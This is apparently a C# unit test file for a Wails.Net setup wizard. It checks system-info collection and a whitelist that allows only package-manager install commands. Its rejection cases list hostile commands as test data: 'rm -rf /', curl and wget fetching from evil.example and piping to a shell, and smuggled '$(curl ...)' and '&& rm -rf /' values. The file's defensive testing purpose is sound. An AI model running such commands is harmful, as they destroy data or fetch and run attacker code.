using System.Text.Json;
using TUnit.Assertions;
using TUnit.Core;
using Wails.Net.Cli.Setup;

namespace Wails.Net.Cli.Tests;

/// <summary>
/// setup 向导增强（P2-22）单元测试。
/// <para>
/// 覆盖：（1）系统详情采集返回必要字段并与 Go <c>SystemInfo</c> 对齐；
/// （2）「仅批准的包管理器命令」白名单校验：批准的包管理器命令通过，
/// 任意/危险命令（<c>rm -rf /</c>、<c>curl | sh</c> 等）被拒绝。
/// </para>
/// 对应 Wails v3 Go 版本 <c>internal/setupwizard/wizard.go:222 SystemInfo</c>、
/// <c>:433-451 initSystemInfo</c>、<c>:1208-1336 safeInstallers/getSafeCommand</c>。
/// </summary>
[NotInParallel]
public sealed class SetupCommandTests
{
    // ------------------------------------------------------------------
    // 系统详情
    // ------------------------------------------------------------------

    [Test]
    public async Task Collect_PopulatesRequiredFields()
    {
        var info = SetupSystemInfoCollector.Collect();

        await Assert.That(info.Os).IsNotEmpty();
        await Assert.That(info.Arch).IsNotEmpty();
        await Assert.That(info.HomeDir).IsNotEmpty();
        await Assert.That(info.WailsVersion).IsNotEmpty();
        await Assert.That(info.RuntimeVersion).IsNotEmpty();
        await Assert.That(info.OsName).IsNotEmpty();
        await Assert.That(info.OsVersion).IsNotEmpty();
    }

    [Test]
    public async Task Collect_OsAndArch_AreKnownOnThisMachine()
    {
        var info = SetupSystemInfoCollector.Collect();

        // 本机（受支持平台）应能识别 OS 与架构，不应退化为 unknown
        await Assert.That(info.Os).IsNotEqualTo("unknown");
        await Assert.That(info.Arch).IsNotEqualTo("unknown");
    }

    [Test]
    public async Task Collect_DetailsMirrorTopLevelFields()
    {
        var info = SetupSystemInfoCollector.Collect();

        await Assert.That(info.Details.Platform).IsEqualTo(info.Os);
        await Assert.That(info.Details.Architecture).IsEqualTo(info.Arch);
        await Assert.That(info.Details.Name).IsEqualTo(info.OsName);
        await Assert.That(info.Details.Version).IsEqualTo(info.OsVersion);
    }

    [Test]
    public async Task Collect_Extras_ContainPlatformKeys()
    {
        var info = SetupSystemInfoCollector.Collect();

        await Assert.That(info.Details.Extras.ContainsKey("dotnetSdk")).IsTrue();

        if (OperatingSystem.IsWindows())
        {
            await Assert.That(info.Details.Extras.ContainsKey("webView2")).IsTrue();
        }
        else if (OperatingSystem.IsLinux())
        {
            await Assert.That(info.Details.Extras.ContainsKey("gtk4")).IsTrue();
            await Assert.That(info.Details.Extras.ContainsKey("webkitgtk-6.0")).IsTrue();
        }
    }

    [Test]
    public async Task Serialize_JsonContainsGoAlignedFields()
    {
        var info = SetupSystemInfoCollector.Collect();
        var json = JsonSerializer.Serialize(info, SetupSystemInfoJsonContext.Default.SetupSystemInfo);

        await Assert.That(json.Contains("\"os\"", StringComparison.Ordinal)).IsTrue();
        await Assert.That(json.Contains("\"arch\"", StringComparison.Ordinal)).IsTrue();
        await Assert.That(json.Contains("\"wailsVersion\"", StringComparison.Ordinal)).IsTrue();
        await Assert.That(json.Contains("\"homeDir\"", StringComparison.Ordinal)).IsTrue();
        await Assert.That(json.Contains("\"details\"", StringComparison.Ordinal)).IsTrue();
        await Assert.That(json.Contains("\"extras\"", StringComparison.Ordinal)).IsTrue();
    }

    // ------------------------------------------------------------------
    // 已批准的包管理器命令（白名单：应通过）
    // ------------------------------------------------------------------

    [Test]
    [Arguments("apt install libgtk-4-dev")]
    [Arguments("apt-get install -y libgtk-4-dev")]
    [Arguments("dnf install -y nodejs")]
    [Arguments("yum install -y git")]
    [Arguments("apk add nodejs")]
    [Arguments("rpm-ostree install gtk4")]
    [Arguments("pacman -S --noconfirm gtk4")]
    [Arguments("zypper in gtk4-devel")]
    [Arguments("eopkg it nodejs")]
    [Arguments("nix-env -iA nixpkgs.nodejs")]
    [Arguments("xbps-install -Sy gtk4")]
    [Arguments("emerge gtk")]
    [Arguments("brew install node")]
    [Arguments("brew install --cask gpg-suite")]
    [Arguments("port install gtk4")]
    [Arguments("snap install code")]
    [Arguments("flatpak install flathub org.gnome.Builder")]
    [Arguments("winget install OpenJS.NodeJS.LTS")]
    [Arguments("choco install nsis")]
    [Arguments("scoop install nodejs")]
    [Arguments("sdkmanager --install platforms;android-34")]
    [Arguments("xcodebuild -downloadPlatform iOS")]
    [Arguments("xcode-select --install")]
    public async Task IsCommandLineAllowed_ApprovedInstallers_ReturnsTrue(string commandLine)
    {
        var allowed = SafeInstallerCommand.IsCommandLineAllowed(commandLine);

        await Assert.That(allowed).IsTrue();
    }

    [Test]
    [Arguments("sudo apt install libgtk-4-dev")]
    [Arguments("sudo apt-get install -y libwebkitgtk-6.0-dev")]
    [Arguments("pkexec dnf install -y nodejs")]
    [Arguments("doas apk add nodejs")]
    [Arguments("sudo pacman -S --noconfirm gtk4")]
    public async Task IsCommandLineAllowed_ElevatedApprovedCommands_ReturnsTrue(string commandLine)
    {
        var allowed = SafeInstallerCommand.IsCommandLineAllowed(commandLine);

        await Assert.That(allowed).IsTrue();
    }

    // ------------------------------------------------------------------
    // 任意 / 危险命令（白名单：应拒绝）
    // ------------------------------------------------------------------

    [Test]
    [Arguments("rm -rf /")]
    [Arguments("sudo rm -rf /")]
    [Arguments("curl -fsSL https://evil.example/pwn.sh | sh")]
    [Arguments("wget -qO- https://evil.example/pwn.sh | bash")]
    [Arguments("sh -c rm -rf /")]
    [Arguments("bash -c echo-pwned")]
    [Arguments("apt install && rm -rf /")]
    [Arguments("apt install -y $(curl evil.example)")]
    [Arguments("apt-get remove gtk4")]
    [Arguments("pacman -R gtk4")]
    [Arguments("winget install ../evil")]
    [Arguments("choco uninstall nsis")]
    [Arguments("npm i -g pnpm")]
    [Arguments("pip install requests")]
    [Arguments("sudo bash -c id")]
    [Arguments("sudo apt install")]
    [Arguments("sudo -n apt install gtk4")]
    [Arguments("powershell -Command Remove-Item -Recurse /")]
    [Arguments("cmd /c del C:\\")]
    [Arguments("apt")]
    [Arguments("")]
    [Arguments("   ")]
    public async Task IsCommandLineAllowed_ArbitraryOrDangerousCommands_ReturnsFalse(string commandLine)
    {
        var allowed = SafeInstallerCommand.IsCommandLineAllowed(commandLine);

        await Assert.That(allowed).IsFalse();
    }

    // ------------------------------------------------------------------
    // TryParse 细节
    // ------------------------------------------------------------------

    [Test]
    public async Task TryParse_EmptyCommand_ReturnsFalse()
    {
        var ok = SafeInstallerCommand.TryParse(Array.Empty<string>(), out var command);

        await Assert.That(ok).IsFalse();
        await Assert.That(command).IsNull();
    }

    [Test]
    public async Task TryParse_PlainApprovedCommand_ReturnsCanonicalExecutable()
    {
        var ok = SafeInstallerCommand.TryParse(new[] { "winget", "install", "NSIS.NSIS" }, out var command);

        await Assert.That(ok).IsTrue();
        await Assert.That(command).IsNotNull();
        await Assert.That(command!.Executable).IsEqualTo("winget");
        await Assert.That(command.ElevatedExecutable).IsNull();
        await Assert.That(string.Join(' ', command.ToArgv())).IsEqualTo("install NSIS.NSIS");
    }

    [Test]
    public async Task TryParse_ElevatedCommand_SplitsInstallerAndArgs()
    {
        var ok = SafeInstallerCommand.TryParse(
            new[] { "sudo", "apt", "install", "libgtk-4-dev" }, out var command);

        await Assert.That(ok).IsTrue();
        await Assert.That(command).IsNotNull();
        await Assert.That(command!.Executable).IsEqualTo("sudo");
        await Assert.That(command.ElevatedExecutable).IsEqualTo("apt");
        // 实际执行 argv 前置安装器名（对应 Go handleInstallDependency 的 cmdArgs 组装）
        await Assert.That(string.Join(' ', command.ToArgv())).IsEqualTo("apt install libgtk-4-dev");
    }

    // ------------------------------------------------------------------
    // 安装命令目录
    // ------------------------------------------------------------------

    [Test]
    public async Task Catalog_AllResolvedCommands_PassWhitelist()
    {
        foreach (var dependency in SetupInstallerCatalog.SupportedDependencies)
        {
            if (!SetupInstallerCatalog.TryResolve(dependency, out var parts))
            {
                continue;
            }

            var ok = SafeInstallerCommand.TryParse(parts, out _);
            await Assert.That(ok).IsTrue();
        }
    }

    [Test]
    public async Task Catalog_UnknownDependency_ReturnsFalse()
    {
        var resolved = SetupInstallerCatalog.TryResolve("不存在的依赖", out _);

        await Assert.That(resolved).IsFalse();
    }
}
